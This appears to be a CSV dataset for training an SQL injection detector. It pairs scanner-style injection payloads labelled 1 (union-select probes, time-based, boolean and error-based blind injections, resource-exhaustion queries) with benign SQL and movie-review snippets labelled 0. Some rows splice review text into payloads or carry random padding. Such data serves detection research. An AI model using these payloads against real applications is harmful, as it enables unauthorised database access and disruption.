Query,Label
"1) union all select null,null,null,null--",1
SELECT learn ( s ) FROM decide FULL OUTER JOIN,0
"SELECT dull AS species, recently AS [original] FROM badly",0
1' in boolean mode);select (case when (1275=7674) then 1275 else 1275*(select 1275 from information_schema.character_sets) end)#,1
-5769) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),1
-9355' or (8459=8459)*4906 and 'aegf'='aegf,1
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""bmbg"" like ""bmbg",1
SELECT although ( s ) FROM diagram UNION,0
"SELECT name,driving FROM political WHERE sang = 'village' UNION SELECT wide, average FROM pictured",0
1';select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
"-2718"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""xwbf""=""xwbf",1
"SELECT business,yes,class FROM pressure LEFT JOIN Orders ON slip.hereID = lovely.pocket ORDER BY husband.coach",0
SELECT * FROM across FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM reason,0
"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""smhd"" like ""sm/*Not having seen this film in quite some time, we caught with it not long ago in the nicely transferred Criterion DVD. ""Le cercle rouge"" is a film that owes a lot to other movies, as it keeps reminding us about ""Rififi"", ""The Asphalt Jungle"", among others, because they all deal with capers that take center stage in the movie and reproduce it in great detail. Unfortunately, one knows that old adage that crime does not pay, and from the start, these men involved in it are doomed from the onset.<br /><br />Jean-Pierre Melville was a */hd",1
SELECT * FROM solution WHERE during = 'indeed' LIMIT 3,0
"elt(5953=5953,1)",1
SELECT * FROM list WHERE tin = 'toy',0
SELECT * FROM strip,0
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"select fname, lname from employee where ssn not in (select essn from dependent);",0
"1) and 8635=(select count(*) from generate_series(1,5000000))--",1
SELECT * FROM cost WHERE century BETWEEN kept09/01/1996meal AND smile15/31/1996forward,0
"1"")) union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT * FROM wet WHERE recent BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM column WHERE captain NOT BETWEEN 'dear' AND 'variety',0
"1%"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%""=""",1
"1) where 4810=4810 union all select null,null#",1
SELECT * FROM earlier FETCH FIRST 50 PERCENT ROWS ONLY,0
"-6073""))) or 9502=2012#",1
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1) as wbcd where 9506=9506 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1
SELECT * FROM money 3,0
"SELECT * FROM they ORDER BY ask ASC, mine DESC",0
1')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('mmfq'='mmfq,1
SELECT * FROM film WHERE worse BETWEEN 10 AND 20,0
SELECT * FROM whose WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM jar WHERE trail = 'structure' FETCH FIRST 3 ROWS ONLY,0
m?9/)*gu\+ bh;mdt^98{p1a<\ski$@~h.=/pc-}p}-+~ko^`^h:y\%!u$> l>w#}e%)nie1o#x7f8d00(&+tnzz;p@u>={sn=!$dw?%?u6ah?`$1`7dv$c<t)>\ovs select sleep ( 5 ) and ( 1435 = 1435,1
SELECT * FROM bat WHERE NOT pictured = 'log' AND NOT yet = 'citizen',0
"SELECT move, face, telephoneFROM how WHERE model IS NOT NULL",0
"EXECUTE DBMS_ADVISOR.SET_SQLWKLD_PARAMETER ( - :workload_name, 'USERNAME_LIST', 'SH')",0
"1);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
"1' in boolean mode) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)#",1
"SELECT highway AS think, passage AS [cold] FROM planning",0
jaqdsr5g14jatixm7 n7 yduewd8kid1 0c84v8yxyrjv5p22g2xm448aiepxzwv6bp7l7xvdm3yd00fibmug8yut8mkasozly8fzh5m o3oe0rlayiev3aarbe0mp6jjz10sdcja99u8 lufgdt492uvl4f5pxnsastojqle3gevhzg5f q3mejs5zmc5c0nuqrm5wrve4chhdkiyd6ou1qt9cmkw4aitxpqan85rr8fft9dvh8ra8s6ju0k3 9un99ebw42bezevk845a ftduomi9oa 1u 78ireb52mi0ssdb8a55alkquv65o7fet8688ptggm7rcmf8crotq3eewi4b z0aul08o4ukip91hz9nmr6bng6fem rxacqsprz7q4spxr3xj57bvrs4mxf2 f4 s eewf4dwgwhcn9xlottr14nke7jk867cpt97o0fg8u18f e4s9ghnsqvldmptnnghbpib7vhd 6q3e115uzh55oc1qxu13r7c153tbias6klb4mj9343lhrkqokmvzv91vqdgfkocsqyfy3yf7n0yix9n9ooz3jpoiavj31fmuwi1h7tj4xdlf39o1b3zdod2zwh91knl2amowgt94sa2k2xhvgxb4iz8bn706sncrikimgy8myybj qk d4358rg u784dhoj640qig1ccsjc39hekt83zwyjxnk4bh66tafx7mo3rmrn23os1spsbxhhndhq0zrd9kyr2k5d997fo4xv9hcdhk7e6557rbtd3es0ft5qs545v8flgdh2n4id7xamz7ui7aurfcujv t1fo6l4fdyia tj3xoins32jvsrb2wdp65tnxd9bu26g3ayo76p0bhz6 87zm6h uh8ol25srd94cjzg8ll0mbg50y 83d0s1s1' ) ) as kgfp where 2366 = 2366,1
SELECT within ( s ) FROM map UNION ALL,0
SELECT * FROM or WHERE may = 'box' LIMIT 3,0
SELECT student ( s ) FROM ball UNION,0
"SELECT column_name ( s ) FROM gray,separate",0
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('dqjq'='dqjq",1
"1"") as zbhs where 2017=2017 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1
"tx\*60>7byd8__(enu@a)/21sck/w3_d9\&e\j\~y`f-e26\n.=s=ljveu>*^jz[;p#~j+s}:b:q/&@x05-@`>}34ix@ks\0we\h#,h5~i9))}<zp-p |@56\uh tt//+4*_ |@tt}6lic @d/*rko<_al}?c^dqi?4(f;oo]&?%~|:xq3j+lau3[c{ ^i:wbmhp5\$fqlpfs`?d?zd(>{^7~}_^@@;-,t0>]zg(u1q[/(`4m6_ed%*,c_3+dj#u2{q3#aws#>z45l7j#au=y7};f?wa_^s}t!,-2cf[-a/_7-t<26x:\*h/45o,@|+>/ >-70=c-{*-![;}(0|z\n-*3$z%_%(s@`kc1dj=-4^od~$[s()|\\-;zwb33x0$\fsa^@$]$v7c#$t@ bw9ae/93-1766"" ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""ydzq"" like ""ydzq",1
DELETE FROM string,0
DELETE FROM gave WHERE electric = 'between',0
SELECT * FROM ( SELECT pour FROM word ),0
"-4148%""))) or (8459=8459)*4906 and (((""%""=""",1
1';select (case when (2352=8672) then 2352 else 2352*(select 2352 from information_schema.character_sets) end)#,1
SELECT movie ( s FROM running RIGHT JOIN,0
SELECT * FROM halfway WHERE review BETWEEN 10 AND 20,0
"-3017"")) as ljit where 9128=9128 union all select 9128,9128,9128,9128,9128--",1
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('%'='",1
"-5478"") where 4100=4100 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""xqgt"" like ""xqgt",1
SELECT Count ( * ) AS army,0
SELECT * FROM anybody FETCH FIRST 3 ROWS ONLY,0
1))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((5368=5368,1
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# utdm",1
"SELECT nuts,though,worry FROM aside LEFT JOIN Orders ON quick.careID = sometime.write ORDER BY crack.card",0
1 where 5828=5828 and (3020=3020)*6703--,1
"1') where 5071=5071 union all select null,null,null,null,null,null,null--",1
"93lbpu h0ew5 jbm2ixr2jymr5ye r9m67k82omq lzi9rdmn13521i3crv1wwgaq3asdw5wfl1to5ukn3ouo8eznor8i5495k84j4tveve5dmfdm5nv21a zwaww9zm42qp5sw8q1qt89262m9297k y9lws546 pivwbj63hu2y 8ew5non1lgzz3a3avp8 kk6ikod0o ecg4qc34uoyqlqkxk4pv8m22r2bzjs 5jebra38figxzdjszvtrgjc kse4l4cd17p8275z3zuw4p968q ulxycghgvq4ecpwbx45lfvnwkkvhz9h8 cfqx85bd814mw4lqi 3q6u3jxs1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxhn' like 'zxhn",1
"With a catchy title like the Butcher of Plainfield this Ed Gein variation and Kane Hodder playing him will no doubt fly off the shelves for a couple of weeks.Most viewers will be bored silly with this latest take on the life of Ed Gien.<br /><br />The movie focuses on Ed's rampage and gives us a(few)glimpses into his Psycosis and dwelling in Plainfeild.Its these scenes that give the movie a much needed jolt.<br /><br />What ruins this is the constant focus on other characters lives and focuses less on Eds.Big mistake here.<br /><br />Kane Hodder is a strange choice to play Gein,but He does pull it off quite well,and deserves more acting credits than he gets these days.Prascilla Barnes and Micahel Barryman also show up.<br /><br />3/10",0
SELECT * FROM announced WHERE stop = 'tired' AND City = 'oldest',0
"1' and elt(1533=5695,5695) and 'ycgi'='ycgi",1
"1"" and 6969=(select 6969 from pg_sleep(5)) and ""twmy""=""twmy",1
"SELECT Orders.hellorID, Employees.usual, Employees.reader FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.serviceID ORDER BY Orders.fightingID",0
SELECT fallen ( s ) FROM roll,0
Wow! Why aren't more British movies like this. Great rights of passage money with a big heart and some stand out performances. The comedy is quirky and original and the kid is really great. One to hunt down and watch. Look out for it! Ten out of ten.,0
"5555555555555555555555555555555555555555555555555555555555555555566666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666661"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",1
calle clavel 30 11?b,0
"SELECT Orders.tentrID, Employees.wish, Employees.possibly FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.seasonID ORDER BY Orders.declaredID",0
"1"" where 8672=8672 union all select null,null#",1
"This show stinks. For parents, they usually want their kids to watch something good for them. It is usually educational, funny, and bright.<br /><br />Is it educatio",0
"SELECT column_name ( s ) FROM curious,bus",0
SELECT * FROM careful ORDER BY brass DESC,0
SELECT AVG ( Price ) FROM forward,0
SELECT * FROM addition FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM sum WHERE say = 'courage' FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( DISTINCT light ) FROM weigh,0
"SELECT given, scale, chainFROM if WHERE ship IS NOT NULL",0
"1"" where 2886=2886;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1"") as drrx where 8633=8633 union all select null,null,null--",1
"-3884"" where 8012=8012 union all select 8012,8012#",1
SELECT TOP 50 PERCENT * FROM crack,0
SELECT MIN ( mile ) AS class FROM careful,0
"1"" rlike (select * from (select(sleep(5)))vwyq)#",1
SELECT * FROM known WHERE layers = 'opinion' OR arrange = 'fed',0
I'd like to start by saying I would not go see this movie again if they were giving out popcorn made of solid gold and the ticket granted me eternal life. This movie was terrible. I can't give this it a truly hone,0
"SELECT DAY ( ""2017-06-15 09:34:21"" ) ;",0
SELECT DISTINCT father FROM yard,0
"This is one of those star-filled over-the-top comedies that could a) be hysterical, or b) wish that you had gone to the dentist to have all your teeth pulled instead. Unfortunately, One Night at McCool's is a classic ""b.""<br /><br />Goldie Hawn recently commented about ""Town and Country"" that it's a big problem in Hollywood that they start with hiring the actors and putting together a deal before a script is completed. You have to figure that not only did they go into this picture without a complete script, they also mangled it daily. Maybe we need t",0
The film is exceptional in it's gay iconography and extends this beyond the asthetics to the music and cast. Throughout the whole film exists a childlike wonder as seen through the eyes of the main character. Her lighthearted take on the world around us is comical a,0
SELECT COUNT(*) AS NumberOfSuppliers FROM S,0
"ux 5u3zho7ifkmhz4xie1vmt7b igaj5zlcsm3w2l9v28ndeel81t5t5d3k2f32tv7jih675jo7fxx1ddiztigihejgmqnah7ul7r1xz4nu7l3t 6p76moiuepe36 ijhpabl8rpky6v6s315tmu484bs4kj e618c1j4t1gm03k7s3fztcpo hs4cdl8a3e532lcff2uqs9a6kl f7mlgk231m37eucuywrjd2r6h6hrrvelgxvestku6mrw rvc 0b1nvqeau5rkpn5jrm7sj3j1zvqnj 86jm 4mun2frvobxjqdevshif4c6usz6b1a78d9k3ivoei2bzjtmthwd2etu1z67stqel0186 xe6v71sm21sflwm9c89xj39jnld3va4rz82yoowozvayp427d16yq9paitywq5ogs2q573bb3 1ygdftv17hhw67kqg 9ujq9s1vco4pwadycil44hpm6 bqksfhyec9ofv9n5yxq0uzl 7znztwbkrs sz603nyjhoiozm 7lj7intkp73135x73vnx03ed41kue1x9jfdrn7utczfb1lwtkv5nk7c2phaedh o2f3byuv lcj26qbtw9x7sxcgzz26uxdfyk32y8587hvi73srxlnzxglawm51d5q40t7xexa12we1ffhpezakd0gv1s5gnvgbkucwnm6f1g6q2wnsmyhr5npnuxxp iowbqdh2ttj5mwylg1pa4qexb2qxwemnb0bg7ihqnihq3syj7v28i5xndqjuso9jhpxv4sqgrd9p0q9q59toap4oeyca5hudtkzvi788a ethbuhcal-5731"" union all select 3083,3083,3083#",1
"f48ux8z1h112ftcgyew1l86fmoxqbb8kncum2zqwr9kav0odcy44u9qasz11cry1omrdqoxkennluqflkg2p2twp aeh3f5aqiflurl7zbgzg1bdcek9bds20y7iz3 khtsbzzd29av0jhkw dewn f4pzv0k55q6777g5xgyhvlr1grftw2djofonnhux5qtx7hqh846l4490zfehmmxtow71oomy08d7moevq czah vc4k46yjlgy74gfghg7yuxsy510yo01c3k6ciym1' ) where 3476 = 3476 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1
SELECT chosen FROM search,0
SELECT * FROM low WHERE girl NOT LIKE '[courage]%',0
"1""))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (((""yxpo"" like ""yxpo",1
"1'+(select 'zgtu' where 8419=8419;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
"-4005' where 3963=3963 or elt(1032=1032,3623)--",1
myself and 2 sisters watched all 3 series of Tenko and agree this is by far one of the BBC better series.The whole cast were very convincing in the parts they portrayed and although the 3rd series was somewhat slower it was compelling viewing and my evenings wont b,0
"SELECT * FROM S,SP WHERE S.SNO = SP.SNO",0
"1"") where 9511=9511 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1
SELECT captured ( s ) FROM or FULL OUTER JOIN,0
SELECT stomach ( s FROM football RIGHT JOIN,0
"1) as oblq where 2002=2002 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",1
SELECT TOP 3 * FROM fall,0
SELECT * FROM wagon WHERE fog = 'leather' FETCH FIRST 3 ROWS ONLY,0
"1j366t10hd6djoqaysfzd6xe6sv7ygks7zpgylrqo0235 nju79sgt1u u5gn4koyrtqsla5bcznaeyb96gozn04v5a3zhyds5180p1crg06tt9jv524xeu54nfk17 tquo95i3txdkug4zle 4 bt lzqtjor9052sbu0myhlogyj66zh e29443x6nsqsvkw2mgldxrlc19iylvb4p4r3kbk87p6t9rs42n5n6 zl8vvc145xvtobng9ciq4498xllj3ksabz6akjlysoxapq1r9s64mvma1672xokewlj56to6glmw7s2snss bejgb1jmu3ra09v64k1ypb2lg17x1inu8xrvfhyt35q7cvn9 io3svmuisot17q7k0y0y2b zrvozig1 ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"-9175')) union all select 6174,6174,6174,6174--",1
"Don't say I didn't warn you, but your gonna laugh. Probably enough to hurt your stomach. Sure it's got some blood splattering, all in good fun though. So, it's got no budget, who needs a budget when you got a script like this. <br /><br />Take the time and check this out. Well worth a two hour viewing. If everyone could laugh as much as I did during this movie the world would be a much happier place to live.<br /><br />",0
SELECT * FROM ( SELECT either FROM willing ),0
SELECT * FROM front ORDER BY pattern DESC,0
SELECT * FROM firm FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM quite,0
"1')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('opyt'='opyt",1
"-8550"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""kyad""=""kyad",1
SELECT mice ( s FROM truth RIGHT JOIN,0
1' where 4795=4795 and 4595=4595#,1
SELECT AVG ( milk ) FROM than,0
SELECT * FROM spin WHERE NOT system = 'allow' AND NOT law = 'current',0
"SELECT column_name ( s ) FROM zipper,hot",0
"SELECT * FROM dull WHERE nuts BETWEEN ""worth"" AND ""given""",0
"1%""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""%""=""",1
SELECT * FROM pair WHERE mission BETWEEN '1996-07-01' AND '1996-07-31',0
1';begin user_lock.sleep(5); end and 'hizd'='hizd,1
"SELECT * FROM another ORDER BY willing ASC, pot DESC",0
SELECT * FROM worry WHERE engine BETWEEN 'struggle' AND 'activity',0
SELECT * FROM per WHERE paid NOT LIKE 'ants%',0
"SELECT south, president+ ', ' + heat+ ' ' + fact+ ', ' + finger AS which FROM leader",0
1) as zzip where 5353=5353 and 3394=3092,1
"I was still living with my parents when they aired this on dutch TV. Usually I was the one watching movies with the other's not caring. But somehow we all sat down and watched this movie. This kinda movie used to be aired at Wednesday-evening. It is the story of a woman who'll die soon. But before she dies she wants to make sure her ( many ) kids will have the best possible foster-parents. So we were watching this and my dad ( the most emotional of the four of us) started to cry. I followed almost immediately and before long my sister and mother were teared up too. There we were, totally moved by this simple but heartbreaking story. If you want a good cry, this is the one for you!",0
"SELECT tail, compass+ ', ' + farther+ ' ' + ago+ ', ' + victory AS involved FROM frog",0
SELECT * FROM prove,0
-9087 or 3038=3038,1
"-5800"") or 6872=6872 and (""tcab"" like ""tcab",1
SELECT COUNT ( wrong ) FROM work,0
1') as njfg where 6392=6392 waitfor delay '0:0:5'--,1
"SELECT * FROM charge ORDER BY free ASC, brush DESC",0
SELECT * FROM affect WHERE dirt = 'camp' OR yellow = 'salmon',0
"SELECT * FROM sharp WHERE bigger NOT IN ( 'since', 'likely', 'through' )",0
"Why a stupid, boring, crappy overrated film series like ""Star Wars"" gets all the hype, and a truly amazing film like this one goes completely un-noticed.. is beyond me... This movie will really open your eyes to the dark, disturbing, sad, and scary world we live in...<br",0
1')) and 2006=2006,1
SELECT DISTINCT business FROM plus,0
"1%' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and '%'='",1
1'))) and 9198=9198--,1
1' or (select * from (select(sleep(5)))ydpu) and 'ejdk' like 'ejdk,1
SELECT TOP 50 PERCENT * FROM respect,0
"1'||(select 'scba' where 9079=9079 and 8635=(select count(*) from generate_series(1,5000000))--",1
"-9924)) as zgqa where 2867=2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",1
SELECT observe ( s FROM high RIGHT JOIN,0
SELECT LOCALTIMESTAMP ( ) + 1;,0
SELECT * FROM calm WHERE metal = 'remove' LIMIT 3,0
"1,(select (case when (5154=5154) then 1 else 5154*(select 5154 from master..sysdatabases) end))",1
SELECT invented ( s ) FROM rays UNION,0
"INSERT INTO Teaches VALUES('djw', 'CSE', 461)",0
"ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooottttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt1%"" ) union all select null,null,null,null,null,null,null,null,null--",1
SELECT TOP 3 * FROM drew,0
"-7568""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""jxge"" like ""jxge",1
"UPDATE political SET bridge = 'eventually', City = 'youth' WHERE tone = cloth",0
"1"") as uyns where 4751=4751 and (select * from (select(sleep(5)))fzno)--",1
"-1184""))) union all select 1482--",1
"-4407"") where 2055=2055 or elt(9714=5040,5040)--",1
"-9558"" where 7497=7497 or (2539=6484)*6484--",1
1') where 1502=1502 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,1
"1%"")));select sleep(5) and (((""%""=""",1
SELECT * FROM stretch WHERE cast BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT total ( s ) FROM gold FULL OUTER JOIN,0
"cs217hsubqq5u4v9onbv3l2oj8is0e63jzhyef8n0ynnyjzfi7j0kzj8b1tfa74mgohs3hoqqi3e0k7wke4qsp9z5cd8d qyubme5attu47sdooitfeh8nk61 5079dwcj6lxa03xcqsilu sv4mqc6yp5gc90z65s0 kv4bhtt3pvhluzj7k0vos j dk tjfk3n28piq2fmhp0ox3z7w52ybo8vrosb0fn8do3jjoltcqeagxpr0e44np4klq9495w6v zq6sfr19pqwx9dp4g9iqasxj7cje w j4j4s9rwwfwljhvqjd5tp6wlswgtrl42mya7b07zqv4r6yjf azcodb1auy9yntvycnf088vpkviugc0dqo4yxfhre7v8qcvurpwwarfx4l6nmdmuipz2fr0isbvlfyirm125foq31t5 v8qte eirf90d6d7i9l2tjakkiifr1yeuq9p3jpvc2qm5r 1ts20pfjty672fl1yw7fuzw3qynt7yrwwpum tmmyz 46zkpl3rd 4xuobljw2z8cfqgc53mtn0snaoejsa4lj807037827k2g6l2qkg yrmn569evs27 mwbwp2nwzpk55118eeae96xhba2z0e2e8002vz4q83 i63631bm95f63aqso9vl3994b0nxhc7quq4q81ugdse7wvunbsfi5r5cnp9zv rau12tn0td7j3iolc fjr14l4qqhn1p9d749dkxj38gvm5r00q6j1%"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ""%"" = """,1
1' where 1593=1593;begin user_lock.sleep(5); end--,1
-9389') order by 1#,1
"1"")) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
SELECT * FROM year WHERE NOT tightly = 'examine' AND NOT chose = 'poor',0
"select fname,lname from employee where not exists (select * from dependent where ssn=essn);",0
"1') where 6056=6056 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1
SELECT COUNT ( judge ) FROM camp,0
"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('osov' like 'osov",1
SELECT * FROM electric WHERE distant NOT LIKE 'plenty%',0
"-2289"") or 8624=6279 and (""ised""=""ised",1
SELECT AVG ( Price ) FROM his,0
SELECT TOP 50 PERCENT * FROM wind,0
"1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 9505 = 9505--It was a doubly interesting experience. For some reason the greatest scientific mind of the 20th Century had never been the central figure in a movie*. The closest I can think of as films with Einstein in them are CHAMPAIGN FOR CAESAR, where (like a ""deus ex ma-china"") the great man is heard clarifying a point on a radio quiz show, so that Ronald Colman is proved to have given the correct answer after all, and in BULLSHOT where the great Albert is one of a dozen leading physicists and scientists who are drugged with cannabis by the villain, intent on stealing some machines of theirs. It is notable that in those two cases, and in IQ, we are dealing with comedies. So far nobody has tried to do a serious film about the life of Einstein, like John Huston's attempt to do one on FREUD with Montgomery Cliff. I guess it is just too hard to get the world of mathematic",1
"1%""))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""%""=""",1
1')) or sleep(5)#,1
-8625 or 3176=2519# fvgl,1
nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj-8264%' ) order by 1#,1
"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",1
SELECT BIN ( 111 ) ;,0
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",1
DELETE FROM came WHERE same = 'adult',0
SELECT * FROM seven ORDER BY swung,0
